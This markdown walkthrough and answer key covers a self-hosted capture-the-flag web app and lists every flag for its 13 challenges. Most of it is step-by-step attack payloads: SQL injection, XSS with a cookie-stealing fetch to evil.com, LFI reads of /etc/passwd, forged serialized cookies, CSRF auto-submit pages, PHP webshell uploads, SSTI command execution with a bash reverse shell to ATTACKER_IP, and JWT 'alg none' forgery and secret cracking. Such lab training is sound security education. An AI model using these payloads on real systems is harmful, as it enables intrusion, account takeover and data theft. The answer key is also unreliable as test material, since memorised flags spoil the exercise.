# 🚩 CyberTech Solutions CTF — Red Team Exploitation Walkthrough

> **Target:** CyberTech Solutions Web Application  
> **Total Challenges:** 13 | **Total Points:** 1,750  
> **Flag Format:** `CCEE{...}`  
> **Default Credentials:** `admin:admin123` · `john:password123` · `guest:guest`

---

## Quick Reference

| # | Challenge | Type | Difficulty | Points | Flag |
|---|-----------|------|:----------:|:------:|------|
| 1 | SQL Injection | Web | 🟢 Easy | 100 | `CCEE{sql_1nj3ct10n_m4st3r}` |
| 2 | Reflected XSS | Web | 🟢 Easy | 100 | `CCEE{xss_r3fl3ct3d_4tt4ck}` |
| 3 | Stored XSS | Web | 🟢 Easy | 100 | `CCEE{st0r3d_xss_1n_c0nt4ct}` |
| 4 | IDOR | Web | 🟢 Easy | 100 | `CCEE{1d0r_vuln3r4b1l1ty_f0und}` |
| 5 | Info Disclosure | OSINT | 🟢 Easy | 50 | `CCEE{b4ckup_f1l3s_l34k_s3cr3ts}` |
| 6 | HTTP Header Leak | OSINT | 🟢 Easy | 50 | `CCEE{h34d3r5_t3ll_s3cr3ts}` |
| 7 | Local File Inclusion | Web | 🟡 Medium | 200 | `CCEE{c0nf1g_f1l3s_4r3_tr34sur3s}` |
| 8 | PHP Object Injection | Web | 🟡 Medium | 200 | `CCEE{c00k13_m0nst3r_4dm1n}` |
| 9 | Logic Flaw | Web | 🟡 Medium | 150 | `CCEE{l0g1c_fl4w_sh0pp1ng_spr33}` |
| 10 | CSRF | Web | 🟡 Medium | 150 | `CCEE{csrf_n0_t0k3n_n0_pr0t3ct10n}` |
| 11 | Unrestricted File Upload | Web | 🟡 Medium | 150 | `CCEE{unr3str1ct3d_f1l3_upl04d_rce}` |
| 12 | SSTI | Web | 🔴 Hard | 250 | `CCEE{sst1_t3mpl4t3_1nj3ct10n_pwn3d}` |
| 13 | JWT Exploitation | Web | 🔴 Hard | 250 | `CCEE{jwt_4lg0r1thm_c0nfus10n_4tt4ck}` |

---

# DETAILED EXPLOITATION WALKTHROUGHS

---

## Challenge 1 — SQL Injection (Easy · 100pts)

**Target Page:** `/challenge/login_legacy.php`  
**Vulnerability:** User input is concatenated directly into an SQL query with no sanitization.

### Reconnaissance

1. Open the main login page at `/challenge/login.php`.
2. Notice the developer comment in the HTML source (View Source → scroll to the bottom):
   ```html
   <!-- Legacy login at login_legacy.php has known SQL injection issues -->
   ```
3. Also check `/challenge/robots.txt` — it lists `Disallow: /login_legacy.php`, confirming the endpoint exists.
4. Navigate to `/challenge/login_legacy.php`.

### Identify the Vulnerability

The server-side code builds the query like this:
```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password'
```
Neither `$username` nor `$password` are sanitized or parameterised.

### Exploitation — Step by Step

1. Go to `http://<TARGET>/challenge/login_legacy.php`.
2. In the **Username** field, type:
   ```
   ' OR '1'='1
   ```
3. In the **Password** field, type anything, e.g. `anything`.
4. Click **Sign In**.
5. The SQL query becomes:
   ```sql
   SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'
   ```
   Because `'1'='1'` is always true, the query returns the first user row (admin).
6. The page displays:
   ```
   Login successful! Welcome admin. Here's your reward: CCEE{sql_1nj3ct10n_m4st3r}
   ```

### Alternative Payloads

| Payload (Username field) | Password | Notes |
|---|---|---|
| `admin' -- ` | *(anything)* | Comments out the password check entirely |
| `' OR 1=1 -- ` | *(anything)* | Classic boolean bypass |
| `' UNION SELECT 1,2,3,4,5,6,7 -- ` | *(anything)* | UNION-based — enumerate columns |

### 🏁 Flag: `CCEE{sql_1nj3ct10n_m4st3r}`

---

## Challenge 2 — Reflected XSS (Easy · 100pts)

**Target Page:** `/challenge/about.php`  
**Vulnerability:** The `member` GET parameter is echoed into the page without any sanitization.

### Reconnaissance

1. Visit `/challenge/about.php`.
2. Scroll to the Leadership Team section. Click any "**View Profile**" button.
3. Notice the URL changes to `about.php?member=Robert%20Anderson` and the name is reflected in the HTML:
   ```html
   <h5 class="text-white">Viewing profile: Robert Anderson</h5>
   ```
4. The raw `$_GET['member']` value is output with `echo $member;` — no `htmlspecialchars()`.

### Exploitation — Step by Step

1. Craft a URL with a JavaScript payload in the `member` parameter:
   ```
   http://<TARGET>/challenge/about.php?member=<script>alert('XSS')</script>
   ```
2. Open the URL in your browser.
3. The JavaScript executes (alert box pops up).
4. The server detects the XSS keywords (`<script`, `onerror`, `onload`, `javascript:`) and renders the flag in a green banner above the payload output:
   ```
   🎉 XSS Detected! Flag: CCEE{xss_r3fl3ct3d_4tt4ck}
   ```

### Alternative Payloads

```
about.php?member=<img src=x onerror=alert(1)>
about.php?member=<svg onload=alert(document.cookie)>
about.php?member=<body onload=alert('XSS')>
```

### 🏁 Flag: `CCEE{xss_r3fl3ct3d_4tt4ck}`

---

## Challenge 3 — Stored XSS (Easy · 100pts)

**Target Page:** `/challenge/contact.php`  
**Vulnerability:** Contact form messages are stored in the database and displayed in the "Public Feedback" section without sanitization.

### Reconnaissance

1. Visit `/challenge/contact.php`.
2. Scroll down to the **Public Feedback** section — existing messages are listed here.
3. Inspect the source code: the `name` field uses `htmlspecialchars()`, but the **message** field is rendered raw:
   ```php
   <p class="text-secondary mb-0"><?php echo $row['message']; ?></p>
   ```

### Exploitation — Step by Step

1. Go to `http://<TARGET>/challenge/contact.php`.
2. Fill out the contact form:
   - **Name:** `Attacker`
   - **Email:** `attacker@evil.com`
   - **Message:**
     ```html
     <script>alert('XSS')</script>
     ```
3. Click **Send Message**.
4. After submission, the page reloads and the Public Feedback section now includes your message.
5. The `<script>` tag executes, and the server detects the stored XSS pattern in the database.
6. A green flag card appears in the Public Feedback grid:
   ```
   🎉 XSS Detected!
   Flag: CCEE{st0r3d_xss_1n_c0nt4ct}
   ```

### Alternative Payloads

```html
<img src=x onerror=alert(document.cookie)>
<svg/onload=fetch('https://evil.com/steal?c='+document.cookie)>
```

### 🏁 Flag: `CCEE{st0r3d_xss_1n_c0nt4ct}`

---

## Challenge 4 — IDOR: Insecure Direct Object Reference (Easy · 100pts)

**Target Page:** `/challenge/view_message.php`  
**Vulnerability:** Messages are fetched by ID with no authorization check — any logged-in user can view any message, including private admin messages.

### Reconnaissance

1. Log in as any user (e.g. `john:password123`) via `/challenge/login.php`.
2. Visit the Contact page and click on any public message. Notice the URL:
   ```
   view_message.php?id=2
   ```
3. The query uses the `id` parameter directly:
   ```sql
   SELECT * FROM messages WHERE id = $msg_id
   ```
4. There is **no check** that the logged-in user owns or is authorized to see that message.

### Exploitation — Step by Step

1. Log in as `john` / `password123`.
2. Navigate directly to:
   ```
   http://<TARGET>/challenge/view_message.php?id=1
   ```
3. Message `id=1` is a **private admin message** (`is_private = 1`). The page renders it anyway.
4. The message body contains the flag:
   ```
   CCEE{1d0r_vuln3r4b1l1ty_f0und}
   ```
5. Notice the yellow "Private Message (Admin Only)" badge — proving you accessed an unauthorized resource.

### 🏁 Flag: `CCEE{1d0r_vuln3r4b1l1ty_f0und}`

---

## Challenge 5 — Information Disclosure (Easy · 50pts)

**Target Page:** `/challenge/config.php.bak` and `/challenge/robots.txt`  
**Vulnerability:** A backup configuration file containing credentials and a flag is publicly accessible on the web server.

### Reconnaissance

1. Check `/challenge/robots.txt`:
   ```
   Disallow: /config.php.bak
   ```
   This is a common misconfiguration — `robots.txt` reveals hidden files instead of protecting them.
2. Also check the HTML source of `/challenge/login.php`:
   ```html
   <!-- config.php.bak was supposed to be deleted -->
   ```

### Exploitation — Step by Step

1. Navigate to:
   ```
   http://<TARGET>/challenge/config.php.bak
   ```
2. The browser renders the file's contents. Since `.bak` files are not processed by PHP, the source code (with comments) is displayed in plaintext.
3. Inside the file you'll find:
   ```php
   // Admin credentials for testing
   // Username: admin
   // Password: admin123
   
   // Secret flag for CTF
   // CCEE{b4ckup_f1l3s_l34k_s3cr3ts}
   ```

### 🏁 Flag: `CCEE{b4ckup_f1l3s_l34k_s3cr3ts}`

---

## Challenge 6 — HTTP Header Leak (Easy · 50pts)

**Target Page:** `/challenge/dashboard.php`  
**Vulnerability:** A custom HTTP response header `X-Custom-Flag` leaks the flag to anyone who inspects the response headers.

### Reconnaissance

1. Log in to the application (any account works).
2. You'll be redirected to `/challenge/dashboard.php`.
3. The developer comments in `login.php` hint:
   ```html
   <!-- Check dashboard headers with curl -I -->
   ```

### Exploitation — Step by Step

**Method A — Using `curl`:**
1. First, obtain a session cookie by logging in:
   ```bash
   curl -c cookies.txt -d "username=john&password=password123" \
        http://<TARGET>/challenge/login.php
   ```
2. Then fetch the dashboard headers:
   ```bash
   curl -I -b cookies.txt http://<TARGET>/challenge/dashboard.php
   ```
3. In the response headers, you'll see:
   ```
   X-Custom-Flag: CCEE{h34d3r5_t3ll_s3cr3ts}
   X-Powered-By: CyberTech-Legacy-v1.0
   ```

**Method B — Browser DevTools:**
1. Log in and navigate to the dashboard.
2. Open **DevTools** → **Network** tab.
3. Refresh the page and click on the `dashboard.php` request.
4. Look at the **Response Headers** section — the flag is in `X-Custom-Flag`.

### 🏁 Flag: `CCEE{h34d3r5_t3ll_s3cr3ts}`

---

## Challenge 7 — Local File Inclusion / LFI (Medium · 200pts)

**Target Page:** `/challenge/admin.php`  
**Vulnerability:** The `file` GET parameter is passed directly to `include()` and `readfile()`, allowing arbitrary file reads via PHP stream wrappers.

### Reconnaissance

1. Log in as **admin** (`admin:admin123`) — these credentials were found via the Info Disclosure challenge.
2. Navigate to `/challenge/admin.php`. Notice the sidebar links:
   ```
   ?file=admin_welcome
   ?file=admin_users
   ?file=admin_logs
   ?file=admin_settings
   ```
3. The code does:
   ```php
   $page = isset($_GET['file']) ? $_GET['file'] : 'admin_welcome';
   include($page . '.php');   // for files that exist
   @readfile($page);          // for stream wrappers (contains '://')
   ```

### Exploitation — Step by Step

1. Log in as `admin:admin123`.
2. Navigate to:
   ```
   http://<TARGET>/challenge/admin.php?file=php://filter/read=convert.base64-encode/resource=includes/config
   ```
   > **Note:** The `.php` extension is appended automatically, so you omit it in the parameter.  
   > The `php://filter` wrapper triggers `readfile()` which reads the file and base64-encodes its output.
3. The "Console Output" area on the admin panel will now show a long base64 string.
4. Copy the base64 string and decode it:
   ```bash
   echo "PD9waHAK..." | base64 -d
   ```
5. In the decoded PHP source, you'll find the flag as a comment at the bottom:
   ```php
   // CCEE{c0nf1g_f1l3s_4r3_tr34sur3s}
   ```

### Advanced LFI Payloads

```
# Read /etc/passwd
?file=php://filter/read=convert.base64-encode/resource=/etc/passwd

# Read other PHP files
?file=php://filter/read=convert.base64-encode/resource=login

# Direct inclusion of system files
?file=/etc/passwd
```

### 🏁 Flag: `CCEE{c0nf1g_f1l3s_4r3_tr34sur3s}`

---

## Challenge 8 — PHP Object Injection (Medium · 200pts)

**Target Page:** `/challenge/login.php`  
**Vulnerability:** The `session_token` cookie is base64-decoded and then passed to `unserialize()` without validation, allowing an attacker to craft a serialized `UserSession` object with admin privileges.

### Reconnaissance

1. Log in as any user (e.g. `guest:guest`) via `/challenge/login.php`.
2. Open **DevTools** → **Application** → **Cookies**.
3. Find the cookie named `session_token`. Its value is a base64 blob.
4. Decode it:
   ```bash
   echo "<cookie-value>" | base64 -d
   ```
   Output:
   ```
   O:11:"UserSession":3:{s:8:"username";s:5:"guest";s:4:"role";s:4:"user";s:7:"isValid";b:1;}
   ```
5. This confirms the app uses PHP object serialization in cookies.

### Understanding the Vulnerable Code

```php
class UserSession {
    public $username;
    public $role;
    public $isValid = false;

    function __wakeup() {
        if ($this->role === 'admin') {
            $this->isValid = true;
        }
    }
}

// The vulnerable call:
$session = unserialize(base64_decode($_COOKIE['session_token']));
if ($session && $session->isValid && $session->role === 'admin') {
    // Grants admin access!
}
```

### Exploitation — Step by Step

1. Craft a serialized `UserSession` object with `role=admin`:
   ```
   O:11:"UserSession":3:{s:8:"username";s:5:"admin";s:4:"role";s:5:"admin";s:7:"isValid";b:1;}
   ```
2. Base64-encode this payload:
   ```bash
   echo -n 'O:11:"UserSession":3:{s:8:"username";s:5:"admin";s:4:"role";s:5:"admin";s:7:"isValid";b:1;}' | base64
   ```
   Result:
   ```
   TzoxMToiVXNlclNlc3Npb24iOjM6e3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6NDoicm9sZSI7czo1OiJhZG1pbiI7czo3OiJpc1ZhbGlkIjtiOjE7fQ==
   ```
3. Open **DevTools** → **Application** → **Cookies**.
4. Either edit the existing `session_token` cookie or create a new one:
   - **Name:** `session_token`
   - **Value:** `TzoxMToiVXNlclNlc3Npb24iOjM6e3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6NDoicm9sZSI7czo1OiJhZG1pbiI7czo3OiJpc1ZhbGlkIjtiOjE7fQ==`
   - **Path:** `/`
5. Navigate to `/challenge/login.php` (or refresh the page).
6. The `__wakeup()` magic method fires, sets `isValid = true`, and the code redirects you to the **Admin Panel**.
7. The admin panel shows a green banner:
   ```
   🎉 Congratulations! You accessed the admin panel via cookie manipulation!
   Flag: CCEE{c00k13_m0nst3r_4dm1n}
   ```

### Using curl

```bash
curl -b "session_token=TzoxMToiVXNlclNlc3Npb24iOjM6e3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6NDoicm9sZSI7czo1OiJhZG1pbiI7czo3OiJpc1ZhbGlkIjtiOjE7fQ==" \
     http://<TARGET>/challenge/login.php -L
```

### 🏁 Flag: `CCEE{c00k13_m0nst3r_4dm1n}`

---

## Challenge 9 — Logic Flaw (Medium · 150pts)

**Target Page:** `/challenge/shop.php`  
**Vulnerability:** The quantity field accepts negative values. A negative quantity results in a negative cost, which is subtracted from your balance — effectively *adding* credits.

### Reconnaissance

1. Log in as `john:password123`.
2. Navigate to `/challenge/shop.php`.
3. You start with **$100** credits. The **CTF Flag** item costs **$1,000,000**.
4. Inspect the code logic:
   ```php
   $total_cost = $item['price'] * $quantity;    // price * (-100) = negative number
   $new_credits = $current_credits - $total_cost; // 100 - (-500000) = 500100
   ```

### Exploitation — Step by Step

1. Go to `/challenge/shop.php` while logged in.
2. Find any item (e.g. "Standard Support" at $50).
3. Change the **quantity** field to `-100000` (use browser DevTools or just type it in the number input).
4. Click **Buy Now**.
5. The server calculates: `50 × (-100000) = -5,000,000`. Then: `100 - (-5,000,000) = 5,000,100`.
6. You now have **$5,000,100** credits! The page confirms:
   ```
   Interesting... you 'returned' 100000 x Standard Support and gained $5000000 credits!
   ```
7. Now find the **CTF Flag** item ($1,000,000).
8. Set quantity to `1` and click **Buy Now**.
9. The page displays:
   ```
   You bought the flag! Here it is: CCEE{l0g1c_fl4w_sh0pp1ng_spr33}
   ```

### 🏁 Flag: `CCEE{l0g1c_fl4w_sh0pp1ng_spr33}`

---

## Challenge 10 — Cross-Site Request Forgery / CSRF (Medium · 150pts)

**Target Page:** `/challenge/profile.php`  
**Vulnerability:** All profile-modifying forms (password change, email change, credit transfer) have **no CSRF tokens** and no `SameSite` cookie attribute.

### Reconnaissance

1. Log in and go to `/challenge/profile.php`.
2. View the form HTML source — notice there are **no hidden `csrf_token` fields** in any form.
3. The actions are simple POST requests with no origin/referer validation:
   ```html
   <form method="POST" action="profile.php">
       <input type="password" name="new_password">
       ...
   </form>
   ```
4. Check `/challenge/exploits/csrf_exploit.html` for a ready-made attack page.

### Exploitation — Step by Step

1. Ensure a victim is logged in (e.g. log in as `john:password123` in one tab).
2. Create an attacker HTML page (or use the provided `exploits/csrf_exploit.html`):
   ```html
   <html>
   <body>
     <h1>You won a prize!</h1>
     
     <!-- Hidden form: changes victim's password -->
     <iframe name="csrf1" style="display:none;"></iframe>
     <form id="attack" method="POST"
           action="http://<TARGET>/challenge/profile.php"
           target="csrf1" style="display:none;">
       <input type="hidden" name="new_password" value="hacked123">
     </form>
     
     <script>document.getElementById('attack').submit();</script>
   </body>
   </html>
   ```
3. Open this HTML file in the **same browser** where the victim is logged in.
4. The hidden form auto-submits — the victim's password is now `hacked123`.
5. The flag is documented in the page's HTML source comment:
   ```html
   <!-- Flag: CCEE{csrf_n0_t0k3n_n0_pr0t3ct10n} -->
   ```

### Other CSRF Attack Vectors on this Page

| Attack | POST Parameters |
|--------|----------------|
| Change password | `new_password=hacked123` |
| Change email | `email=attacker@evil.com` |
| Steal credits | `transfer_to=admin&transfer_amount=99999` |

### 🏁 Flag: `CCEE{csrf_n0_t0k3n_n0_pr0t3ct10n}`

---

## Challenge 11 — Unrestricted File Upload → RCE (Medium · 150pts)

**Target Page:** `/challenge/careers.php`  
**Vulnerability:** The file upload has **zero validation** — no extension check, no MIME check, no file renaming. Uploads go to a web-accessible `uploads/` directory with PHP execution enabled.

### Reconnaissance

1. Visit `/challenge/careers.php`.
2. Notice the form hint: "Accepts PDF, DOCX, **or any file type**."
3. The upload code:
   ```php
   $target_file = $target_dir . basename($_FILES["resume"]["name"]);
   move_uploaded_file($_FILES["resume"]["tmp_name"], $target_file);
   ```
   No checks at all — the original filename and extension are preserved.

### Exploitation — Step by Step

1. Create a PHP webshell file on your local machine. Save it as `shell.php`:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
2. Go to `http://<TARGET>/challenge/careers.php`.
3. Fill in:
   - **Name:** `Hacker`
   - **Email:** `hacker@evil.com`
   - **Position:** *(any)*
   - **Resume:** Upload `shell.php`
4. Click **Submit Application**.
5. The page confirms: `Application submitted! Resume: shell.php`
6. Your webshell is now at:
   ```
   http://<TARGET>/challenge/uploads/shell.php
   ```
7. Execute commands via the `cmd` parameter:
   ```
   http://<TARGET>/challenge/uploads/shell.php?cmd=cat includes/upload_flag.txt
   ```
8. The output contains the flag: `CCEE{unr3str1ct3d_f1l3_upl04d_rce}`

### Alternative Webshell Payloads

```php
# Direct flag reader — save as flag_reader.php
<?php echo file_get_contents('includes/upload_flag.txt'); ?>

# Full interactive shell
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; ?>
```

### Using curl

```bash
# Upload the shell
curl -F "name=Test" -F "email=test@test.com" -F "position=Tester" \
     -F "resume=@shell.php" \
     http://<TARGET>/challenge/careers.php

# Execute command
curl "http://<TARGET>/challenge/uploads/shell.php?cmd=cat%20includes/upload_flag.txt"
```

### 🏁 Flag: `CCEE{unr3str1ct3d_f1l3_upl04d_rce}`

---

## Challenge 12 — Server-Side Template Injection / SSTI (Hard · 250pts)

**Target Page:** `/challenge/newsletter.php?mode=preview`  
**Vulnerability:** The custom template engine uses `eval()` on user-controlled expressions via `${...}` and `{{= ... }}` syntax, enabling arbitrary PHP code execution.

### Reconnaissance

1. Visit `/challenge/newsletter.php`. You'll see a normal newsletter signup page.
2. Add `?mode=preview` to the URL to access the hidden **Template Editor**:
   ```
   http://<TARGET>/challenge/newsletter.php?mode=preview
   ```
3. The template engine supports variable substitution (`{{company}}`, `{{year}}`, etc.).
4. It also has two dangerous expression syntaxes:
   ```php
   // Pattern: ${expression} → eval("return expression;")
   preg_match_all('/\$\{(.+?)\}/', $output, $matches);
   $result = @eval("return $expression;");
   
   // Pattern: {{= expression }} → eval("return expression;")
   preg_match_all('/\{\{=\s*(.+?)\s*\}\}/', $output, $matches);
   $result = @eval("return $expression;");
   ```

### Exploitation — Step by Step

**Step 1: Confirm Code Execution**
1. Navigate to `http://<TARGET>/challenge/newsletter.php?mode=preview`.
2. In the **Template Content** textarea, type:
   ```
   The answer is: ${7*7}
   ```
3. Click **Preview Template**.
4. The preview panel shows: `The answer is: 49`  
   → **Code execution confirmed!**

**Step 2: Read the Flag**
5. Replace the template content with:
   ```
   ${file_get_contents('includes/ssti_flag.txt')}
   ```
6. Click **Preview Template**.
7. The preview displays the flag: `CCEE{sst1_t3mpl4t3_1nj3ct10n_pwn3d}`

### Alternative Payloads

```
# Using the {{= }} syntax
{{= file_get_contents('includes/ssti_flag.txt') }}

# System information
${phpinfo()}

# OS command execution
${shell_exec('whoami')}
${system('cat includes/ssti_flag.txt')}

# Read /etc/passwd
${file_get_contents('/etc/passwd')}

# Reverse shell (advanced)
${shell_exec('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"')}
```

### 🏁 Flag: `CCEE{sst1_t3mpl4t3_1nj3ct10n_pwn3d}`

---

## Challenge 13 — JWT Exploitation (Hard · 250pts)

**Target Page:** `/challenge/jwt_demo.php` and `/challenge/api/auth.php`  
**Vulnerabilities:**
1. Algorithm Confusion — accepts `"alg": "none"` (skips signature verification)
2. Weak Secret — `supersecretkey123` (brute-forceable)
3. No Token Expiration — stolen tokens work forever

### Reconnaissance

1. Visit `/challenge/jwt_demo.php` — this is the Developer Portal with an API authentication UI.
2. The API endpoint is `/challenge/api/auth.php`.
3. Check the API root for documentation:
   ```bash
   curl http://<TARGET>/challenge/api/auth.php
   ```
   Response lists available endpoints and an example login payload.

### Exploitation — Method 1: Algorithm "none" Attack

**Step 1: Obtain a legitimate JWT**

1. Log in via the API:
   ```bash
   curl -s -X POST "http://<TARGET>/challenge/api/auth.php?action=login" \
        -H "Content-Type: application/json" \
        -d '{"username":"guest","password":"guest"}'
   ```
   Response:
   ```json
   {
     "success": true,
     "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjozLCJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIiLCJpYXQiOjE3...signature..."
   }
   ```

**Step 2: Decode the token**

2. A JWT has three base64-encoded parts separated by dots: `header.payload.signature`.
3. Decode the header and payload (use the "Decode" button in the UI, or manually):
   ```bash
   echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9" | base64 -d
   # {"typ":"JWT","alg":"HS256"}
   
   echo "eyJ1c2VyX2lkIjozLCJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIiLCJpYXQiOjE3...}" | base64 -d
   # {"user_id":3,"username":"guest","role":"user","iat":17...}
   ```

**Step 3: Forge a new token**

4. Create a new header with `"alg":"none"`:
   ```json
   {"typ":"JWT","alg":"none"}
   ```
5. Create a new payload with `"role":"admin"`:
   ```json
   {"user_id":1,"username":"admin","role":"admin","iat":1234567890}
   ```
6. Base64url-encode both parts:
   ```bash
   echo -n '{"typ":"JWT","alg":"none"}' | base64 | tr '+/' '-_' | tr -d '='
   # eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0
   
   echo -n '{"user_id":1,"username":"admin","role":"admin","iat":1234567890}' | base64 | tr '+/' '-_' | tr -d '='
   # eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxMjM0NTY3ODkwfQ
   ```
7. Assemble the forged token (leave the signature empty but keep the trailing dot):
   ```
   eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxMjM0NTY3ODkwfQ.
   ```

**Step 4: Use the forged token**

8. Request the admin profile with the forged token:
   ```bash
   curl -s "http://<TARGET>/challenge/api/auth.php?action=profile" \
        -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxMjM0NTY3ODkwfQ."
   ```
   Response:
   ```json
   {
     "success": true,
     "message": "Welcome, Admin!",
     "flag": "CCEE{jwt_4lg0r1thm_c0nfus10n_4tt4ck}",
     "secret_info": "You have unlocked admin access via JWT manipulation!"
   }
   ```

### Exploitation — Method 2: Brute-Force the Secret Key

```bash
# Save a valid guest JWT to a file
echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.<payload>.<signature>" > jwt.txt

# Crack with hashcat
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Or with john
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Result: supersecretkey123
```

Once cracked, use the secret to sign a new token with `role: admin` using any JWT library or tool like [jwt.io](https://jwt.io).

### 🏁 Flag: `CCEE{jwt_4lg0r1thm_c0nfus10n_4tt4ck}`

---

# Files Structure

```
challenge/
├── index.php              # Homepage
├── about.php              # Reflected XSS (Challenge 2)
├── contact.php            # Stored XSS (Challenge 3)
├── login_legacy.php       # SQL Injection (Challenge 1)
├── login.php              # PHP Object Injection (Challenge 8)
├── dashboard.php          # HTTP Header Leak (Challenge 6)
├── admin.php              # LFI (Challenge 7)
├── view_message.php       # IDOR (Challenge 4)
├── shop.php               # Logic Flaw (Challenge 9)
├── profile.php            # CSRF (Challenge 10)
├── careers.php            # File Upload (Challenge 11)
├── newsletter.php         # SSTI (Challenge 12)
├── jwt_demo.php           # JWT Demo UI (Challenge 13)
├── services.php           # Services page (no vuln)
├── logout.php             # Logout handler
├── robots.txt             # Hints: hidden endpoints
├── config.php.bak         # Info Disclosure (Challenge 5)
├── api/
│   ├── auth.php           # JWT API (Challenge 13)
│   ├── search.php         # Search API
│   └── scoreboard.php     # CTF scoreboard
├── includes/
│   ├── config.php         # DB config + LFI flag
│   ├── header.php         # Site header
│   ├── footer.php         # Site footer
│   ├── ssti_flag.txt      # SSTI flag file
│   └── upload_flag.txt    # File Upload flag file
├── exploits/
│   └── csrf_exploit.html  # CSRF PoC page
├── uploads/               # Uploaded files land here
└── css/
    └── style.css
```

---

# Setup & Credentials

```bash
docker-compose up --build     # Access at http://localhost:8080
```

| User | Password | Role | Credits |
|------|----------|------|---------|
| `admin` | `admin123` | admin | 999,999 |
| `john` | `password123` | user | 100 |
| `guest` | `guest` | user | 50 |

---

# Scoring

| Challenge | Difficulty | Points |
|-----------|:----------:|:------:|
| Info Disclosure | 🟢 Easy | 50 |
| HTTP Header Leak | 🟢 Easy | 50 |
| SQL Injection | 🟢 Easy | 100 |
| Reflected XSS | 🟢 Easy | 100 |
| Stored XSS | 🟢 Easy | 100 |
| IDOR | 🟢 Easy | 100 |
| Logic Flaw | 🟡 Medium | 150 |
| CSRF | 🟡 Medium | 150 |
| File Upload | 🟡 Medium | 150 |
| LFI | 🟡 Medium | 200 |
| PHP Object Injection | 🟡 Medium | 200 |
| SSTI | 🔴 Hard | 250 |
| JWT Exploitation | 🔴 Hard | 250 |
| | **Total** | **1,750** |
